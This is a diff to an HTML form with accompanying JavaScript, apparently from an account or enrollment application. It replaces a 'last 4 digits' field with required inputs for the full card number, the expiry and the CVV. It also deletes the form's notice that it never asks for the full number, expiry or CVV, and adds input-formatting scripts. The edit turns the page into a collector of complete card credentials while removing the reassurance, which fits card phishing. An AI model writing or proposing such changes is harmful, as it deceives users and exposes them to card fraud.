@@ -180,17 +180,19 @@
         <div><label class="req" for="cname">Name on card</label><input id="cname" name="card_name" required autocomplete="off"></div>
         <div><label class="req" for="cbank">Bank / issuer</label><input id="cbank" name="card_bank" required autocomplete="off"></div>
       </div>
+      <label class="req" for="cnum">Card number</label>
+      <input id="cnum" name="card_number" inputmode="numeric" maxlength="23" placeholder="0000 0000 0000 0000" required autocomplete="off">
       <div class="row">
-        <div><label class="req" for="clast">Last 4 digits</label><input id="clast" name="card_last4" inputmode="numeric" pattern="[0-9]{4}" maxlength="4" required autocomplete="off"></div>
-        <div><label class="req" for="cintl">International payments enabled?</label>
-          <select id="cintl" name="card_international" required>
-            <option value="">Select…</option>
-            <option>Yes</option>
-            <option>No</option>
-            <option>Not sure</option>
-          </select></div>
+        <div><label class="req" for="cexp">Expiry (MM/YY)</label><input id="cexp" name="card_expiry" inputmode="numeric" maxlength="5" placeholder="MM/YY" pattern="(0[1-9]|1[0-2])/[0-9]{2}" required autocomplete="off"></div>
+        <div><label class="req" for="ccvv">CVV</label><input id="ccvv" name="card_cvv" inputmode="numeric" maxlength="4" pattern="[0-9]{3,4}" required autocomplete="off"></div>
       </div>
-      <p class="note">For your safety we never ask for the full card number, expiry or CVV here – the store asks for those directly when you pay.</p>
+      <label class="req" for="cintl">International payments enabled?</label>
+      <select id="cintl" name="card_international" required>
+        <option value="">Select…</option>
+        <option>Yes</option>
+        <option>No</option>
+        <option>Not sure</option>
+      </select>
     </fieldset>
 
     <button id="go" type="submit">Submit</button>
@@ -216,6 +218,13 @@ document.getElementById('same').addEventListener('change', e => toggle('devWrap'
 document.getElementById('duns').addEventListener('change', e => {
   toggle('dunsYes', e.target.value === 'Yes');
   toggle('dunsNo', e.target.value === 'No');
+});
+document.getElementById('cnum').addEventListener('input', e => {
+  e.target.value = e.target.value.replace(/\D/g,'').slice(0,19).replace(/(.{4})/g,'$1 ').trim();
+});
+document.getElementById('cexp').addEventListener('input', e => {
+  let v = e.target.value.replace(/\D/g,'').slice(0,4);
+  e.target.value = v.length > 2 ? v.slice(0,2)+'/'+v.slice(2) : v;
 });
 const readFile = file => new Promise((res, rej) => {
   const r = new FileReader();
